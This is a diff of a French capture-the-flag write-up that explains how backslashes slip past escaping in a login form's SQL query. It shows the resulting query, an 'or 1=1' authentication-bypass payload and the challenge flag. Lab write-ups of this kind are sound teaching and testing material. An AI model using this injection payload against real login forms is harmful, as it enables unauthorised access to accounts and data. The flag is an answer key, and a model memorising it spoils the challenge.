@@ -54,13 +54,13 @@ La requête SQL [3] devient alors:
 En vert la partie qui sera interprétée comme le login et en rouge notre champ d’exploitation.
 Cependant la variable $login est aussi passée dans la fonction stripslashes() qui a pour effet d’échapper
 les back slashes. 
-Il nous suffit d’injecter comme ceci: \\ ce qui nous donnera:
-> SELECT * FROM chall1_users WHERE login = '\\\ ' AND password = 'toto'
+Il nous suffit d’injecter comme ceci: \ \ ce qui nous donnera:
+> SELECT * FROM chall1_users WHERE login = '\ \ \ ' AND password = 'toto'
 
 
 L’injection finale pour se connecter est la suivante.
 
-> login=\\ &password= or 1=1 limit 1 -- a-
+> login=\ \ &password= or 1=1 limit 1 -- a-
 
 
 On obtient ensuite le flag : **ese{Htmlentities_bypass}**
